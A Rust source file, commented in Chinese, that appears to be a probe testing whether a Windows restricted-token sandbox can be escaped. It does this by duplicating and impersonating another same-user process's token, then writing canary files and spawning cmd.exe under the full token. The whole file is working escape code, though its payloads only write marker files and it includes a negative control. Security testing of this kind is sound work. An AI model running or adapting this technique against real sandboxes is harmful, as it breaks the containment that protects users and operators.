//! 逃逸探针:同用户令牌模拟(impersonation)攻击向量。
//!
//! 原理:WRITE_RESTRICTED 令牌只对"写类"访问做 restricting-SID 检查;
//! OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION) 与 OpenProcessToken
//! (TOKEN_DUPLICATE|TOKEN_IMPERSONATE|TOKEN_QUERY) 都是非写访问 →
//! 走原始用户令牌检查 → 同用户目标必然放行。拿到句柄后 DuplicateTokenEx
//! 得模拟令牌 → SetThreadToken →
//!   (a) 线程令牌已是完整令牌,直接写 canary1(该路径无 cap ACE);
//!   (b) 负对照:RevertToSelf 后直写 canary3,应被内核拒绝;
//!   (c) 重新模拟后 CreateProcess(NULL 令牌),子进程应继承完整主令牌并写 canary2。
//!
//! 用法: probe.exe <canary1> <canary2> <canary3> [target-exe]

#![allow(non_snake_case)]
use std::ffi::c_void;

type HANDLE = *mut c_void;
type BOOL = i32;
type DWORD = u32;
type ULONG_PTR = usize;

#[repr(C)] struct PROCESSENTRY32W {
    dwSize: DWORD, cntUsage: DWORD, th32ProcessID: DWORD,
    th32DefaultHeapID: ULONG_PTR, th32ModuleID: DWORD, cntThreads: DWORD,
    th32ParentProcessID: DWORD, pcPriClassBase: i32, dwFlags: DWORD,
    szExeFile: [u16; 260],
}
#[repr(C, align(8))] struct SI { cb: DWORD, rest: [u8; 96] } // sizeof(STARTUPINFOW)==104 on x64
#[repr(C, align(8))] struct PI_ { hProcess: HANDLE, hThread: HANDLE, dwProcessId: DWORD, dwThreadId: DWORD }

const PROCESS_QUERY_LIMITED_INFORMATION: DWORD = 0x1000;
const TOKEN_DUPLICATE: DWORD = 0x0002;
const TOKEN_IMPERSONATE: DWORD = 0x0004;
const TOKEN_QUERY: DWORD = 0x0008;
const TOKEN_ALL_ACCESS: DWORD = 0xF01FF;
const GENERIC_WRITE: DWORD = 0x40000000;
const CREATE_ALWAYS: DWORD = 2;
const TH32CS_SNAPPROCESS: DWORD = 2;
const SECURITY_IMPERSONATION: i32 = 2;
const TOKEN_TYPE_IMPERSONATION: i32 = 2;

#[link(name = "kernel32")]
extern "system" {
    fn OpenProcess(access: DWORD, inherit: BOOL, pid: DWORD) -> HANDLE;
    fn CreateToolhelp32Snapshot(flags: DWORD, pid: DWORD) -> HANDLE;
    fn Process32FirstW(snap: HANDLE, entry: *mut PROCESSENTRY32W) -> BOOL;
    fn Process32NextW(snap: HANDLE, entry: *mut PROCESSENTRY32W) -> BOOL;
    fn CloseHandle(h: HANDLE) -> BOOL;
    fn GetCurrentThread() -> HANDLE;
    fn CreateFileW(name: *const u16, access: DWORD, share: DWORD, sa: *const c_void,
        disp: DWORD, flags: DWORD, tmpl: HANDLE) -> HANDLE;
    fn WriteFile(h: HANDLE, buf: *const c_void, len: u32, written: *mut u32, ov: *const c_void) -> BOOL;
    fn CreateProcessW(app: *const u16, cmd: *mut u16, pa: *const c_void, ta: *const c_void,
        inherit: BOOL, flags: DWORD, env: *const c_void, cwd: *const c_void,
        si: *mut SI, pi: *mut PI_) -> BOOL;
    fn WaitForSingleObject(h: HANDLE, ms: u32) -> u32;
    fn GetCurrentProcess() -> HANDLE;
    fn GetLastError() -> DWORD;
}
#[link(name = "advapi32")]
extern "system" {
    fn OpenProcessToken(proc_: HANDLE, access: DWORD, tok: *mut HANDLE) -> BOOL;
    fn DuplicateTokenEx(existing: HANDLE, access: DWORD, sa: *const c_void,
        level: i32, ttype: i32, new: *mut HANDLE) -> BOOL;
    fn SetThreadToken(thread: *mut HANDLE, tok: HANDLE) -> BOOL;
    fn RevertToSelf() -> BOOL;
}

fn wide(s: &str) -> Vec<u16> { s.encode_utf16().chain([0]).collect() }
fn step(msg: &str) {
    println!("[probe] {msg}");
    if let Ok(tmp) = std::env::var("TEMP") {
        if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true)
            .open(std::path::Path::new(&tmp).join("sbx-probe-steps.log")) {
            use std::io::Write;
            let _ = writeln!(f, "{msg}");
        }
    }
}

fn main() {
    let r = std::panic::catch_unwind(real_main);
    if let Err(p) = r {
        let msg = p.downcast_ref::<String>().cloned()
            .or_else(|| p.downcast_ref::<&str>().map(|s| s.to_string()))
            .unwrap_or_else(|| "<non-string panic>".to_string());
        step(&format!("PANIC: {msg}"));
        std::process::exit(100);
    }
}

fn real_main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 4 { eprintln!("usage: probe <canary1> <canary2> <canary3> [target]"); std::process::exit(2); }
    let (canary1, canary2, canary3) = (&args[1], &args[2], &args[3]);
    let target = args.get(4).map(|s| s.to_lowercase());

    step("snapshot processes");
    let snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
    if snap.is_null() || snap as isize == -1 {
        println!("RESULT: FAIL snapshot err={}", unsafe { GetLastError() });
        return;
    }
    let mut entry = PROCESSENTRY32W {
        dwSize: std::mem::size_of::<PROCESSENTRY32W>() as DWORD, cntUsage: 0, th32ProcessID: 0,
        th32DefaultHeapID: 0, th32ModuleID: 0, cntThreads: 0, th32ParentProcessID: 0,
        pcPriClassBase: 0, dwFlags: 0, szExeFile: [0; 260],
    };
    let mut pids: Vec<(DWORD, String)> = Vec::new();
    unsafe {
        if Process32FirstW(snap, &mut entry) != 0 {
            loop {
                let len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                pids.push((entry.th32ProcessID, String::from_utf16_lossy(&entry.szExeFile[..len])));
                if Process32NextW(snap, &mut entry) == 0 { break; }
            }
        } else {
            eprintln!("[probe] Process32FirstW failed err={:08X} dwSize={}", GetLastError(), entry.dwSize);
        }
        CloseHandle(snap);
    }
    step(&format!("got {} processes in snapshot", pids.len()));

    // 1. 找同用户目标:优先指定名,失败则全表逐个试
    let mut h_dup: HANDLE = std::ptr::null_mut();
    let mut used = String::new();
    let mut ordered: Vec<&(DWORD, String)> = pids.iter().filter(|(_, n)| Some(n.to_lowercase()) == target).collect();
    ordered.extend(pids.iter());
    for (pid, name) in &ordered {
        unsafe {
            let proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, *pid);
            if proc.is_null() { continue; }
            let mut tok: HANDLE = std::ptr::null_mut();
            if OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &mut tok) == 0 {
                CloseHandle(proc); continue;
            }
            let mut dup: HANDLE = std::ptr::null_mut();
            let ok = DuplicateTokenEx(tok, TOKEN_ALL_ACCESS, std::ptr::null(), SECURITY_IMPERSONATION, TOKEN_TYPE_IMPERSONATION, &mut dup);
            CloseHandle(tok); CloseHandle(proc);
            if ok != 0 {
                h_dup = dup; used = format!("{pid} ({name})");
                step(&format!("duplicated impersonation token from pid {pid} ({name})"));
                break;
            }
        }
    }
    if h_dup.is_null() {
        println!("RESULT: FAIL no duplicateable same-user token found");
        return;
    }

    // 2a. 模拟后直写 canary1(无 cap ACE;若线程令牌生效,内核按完整令牌放行)
    unsafe {
        let mut th = GetCurrentThread();

        // 实验 A:模拟自己进程的令牌(受限令牌的 impersonation 副本)——纯行为对照
        let mut self_tok: HANDLE = std::ptr::null_mut();
        let self_ok = OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &mut self_tok);
        step(&format!("open self token ok={self_ok}"));
        if self_ok != 0 {
            let mut self_dup: HANDLE = std::ptr::null_mut();
            let d = DuplicateTokenEx(self_tok, TOKEN_ALL_ACCESS, std::ptr::null(), SECURITY_IMPERSONATION, TOKEN_TYPE_IMPERSONATION, &mut self_dup);
            step(&format!("dup self token ok={d}"));
            if d != 0 {
                step("calling SetThreadToken(SELF)");
                let rc = SetThreadToken(&mut th, self_dup);
                step(&format!("SetThreadToken(SELF) returned rc={rc}"));
                if rc != 0 { RevertToSelf(); step("RevertToSelf after SELF ok"); }
            }
            CloseHandle(self_tok);
        }

        // 实验 B:模拟外部进程令牌(explorer)——逃逸路径本体
        step("calling SetThreadToken");
        let rc = SetThreadToken(&mut th, h_dup);
        step(&format!("SetThreadToken returned rc={rc}"));
        if rc == 0 {
            println!("RESULT: FAIL SetThreadToken err={}", GetLastError());
            return;
        }
        step("SetThreadToken OK — thread now runs the impersonated full token");
        let w = wide(canary1);
        let content: Vec<u16> = "pwned-by-impersonation\0".encode_utf16().collect();
        let hfile = CreateFileW(w.as_ptr(), GENERIC_WRITE, 0, std::ptr::null(), CREATE_ALWAYS, 0, std::ptr::null_mut());
        if hfile as isize == -1 {
            println!("RESULT: PARTIAL impersonated but canary1 CreateFileW err={} — write still blocked", GetLastError());
        } else {
            let mut written: u32 = 0;
            WriteFile(hfile, content.as_ptr() as *const c_void, (content.len() * 2) as u32, &mut written, std::ptr::null_mut());
            CloseHandle(hfile);
            step("canary1 WRITTEN under impersonated token");
        }
        // 2b. 负对照:撤销模拟,直写 canary3 → 受限令牌下必须被拒
        RevertToSelf();
        let w3 = wide(canary3);
        let h3 = CreateFileW(w3.as_ptr(), GENERIC_WRITE, 0, std::ptr::null(), CREATE_ALWAYS, 0, std::ptr::null_mut());
        if h3 as isize == -1 {
            step(&format!("negative control OK: un-impersonated direct write denied err={:08X}", GetLastError()));
        } else {
            CloseHandle(h3);
            step("negative control ANOMALY: direct write succeeded without impersonation (canary3 valid!)");
        }
        // 2c. 重新模拟 + CreateProcess(NULL 令牌) → 子进程主令牌应为完整令牌
        let mut th2 = GetCurrentThread();
        SetThreadToken(&mut th2, h_dup);
        let exe = wide("C:\\Windows\\System32\\cmd.exe");
        let mut cmd = wide(&format!("cmd.exe /c echo pwned-by-full-token-child> \"{}\"", canary2));
        let mut si = SI { cb: std::mem::size_of::<SI>() as DWORD, rest: [0; 96] };
        let mut pi = PI_ { hProcess: std::ptr::null_mut(), hThread: std::ptr::null_mut(), dwProcessId: 0, dwThreadId: 0 };
        let ok = CreateProcessW(exe.as_ptr(), cmd.as_mut_ptr(), std::ptr::null(), std::ptr::null(), 0, 0,
            std::ptr::null(), std::ptr::null(), &mut si, &mut pi);
        if ok == 0 {
            println!("RESULT: PARTIAL canary1-via-impersonation, but CreateProcess(NULL) err={:08X}", GetLastError());
        } else {
            step(&format!("full-token child spawned pid={}", pi.dwProcessId));
            WaitForSingleObject(pi.hProcess, 15000);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        }
        RevertToSelf();
        let _ = used;
    }
    println!("RESULT: PROBE_DONE");
}
